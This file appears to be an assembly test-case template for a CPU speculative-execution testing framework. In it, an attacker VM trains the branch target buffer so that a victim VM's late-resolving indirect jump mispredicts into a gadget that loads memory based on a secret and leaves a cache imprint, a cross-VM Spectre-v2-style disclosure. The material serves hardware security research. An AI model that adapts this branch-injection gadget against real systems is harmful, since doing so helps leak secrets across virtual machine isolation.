.intel_syntax noprefix

# ============================================================================
# v2v injection, wide misprediction window. same as template-v2v-inject.asm but
# the indirect branch's target register resolves via a long dependent imul chain,
# so the mispredicted disclosure has many cycles to issue its secret-dependent load
# before the branch resolves. the same chain is placed in both the attacker's train
# and the victim so the two jmps stay byte-aligned (btb source collision preserved).
#
# diagnostic: if this imprints (observer trace varies with the victim secret) the
# earlier flat result was a too-short window; if it stays frozen, vm->vmvictim btb
# steering isn't landing and the window is not the issue.
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.vm.function_vm_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vm.function_vm_train: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.1: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vmvictim.function_vmvictim_1: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_3: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.switch_h2g.vmvictim.1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_g2h.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
.macro.set_h2g_target.vm.function_vm_measure: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- attacker (guest user, observer) --------------
.section .data.vm
.function_vm_train:
.macro.landing_h2g.vm_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_vm_disclosure]  # noremove   (train target)
# --- window-widening dependent chain (identical to the victim's) ---
mov r8, rax   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
and r8, 0     # noremove   (r8 -> 0, so rbx unchanged but resolves late)
add rbx, r8   # noremove
jmp rbx  # noremove                                 # trains btb[this pc] = disclosure

.function_vm_safe:
lfence  # noremove
.macro.switch_g2h.main.vm_safe: nop qword ptr [rax + 0xff]
lfence  # noremove

.function_vm_disclosure:
lfence  # noremove   (architectural jmp target; inert in the attacker)
.macro.switch_g2h.main.vm_1: nop qword ptr [rax + 0xff]
lfence

.function_vm_0:
.macro.landing_h2g.vm_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.vm_0: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.vm_0: nop qword ptr [rax + 0xff]
lfence

.function_vm_measure:
.macro.landing_h2g.vm_2: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.measurement_end.vm_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (guest user) --------------------------
.section .data.vmvictim
.function_vmvictim_1:
.macro.landing_h2g.vmvictim_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_vmvictim_safe]  # noremove   (arch target)
# --- window-widening dependent chain (identical to the attacker's) ---
mov r8, rax   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
imul r8, r8   # noremove
and r8, 0     # noremove
add rbx, r8   # noremove
jmp rbx  # noremove                     # arch -> safe (resolves late); mispredict -> disclosure

.function_vmvictim_safe:
lfence  # noremove
.macro.switch_g2h.main.vmvictim_1: nop qword ptr [rax + 0xff]
lfence

.function_vmvictim_disclosure:
and rax, 0b111111000000  # noremove
mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load)
and rcx, 0b111111000000  # noremove
mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache)
lfence  # noremove
.macro.switch_g2h.main.vmvictim_2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
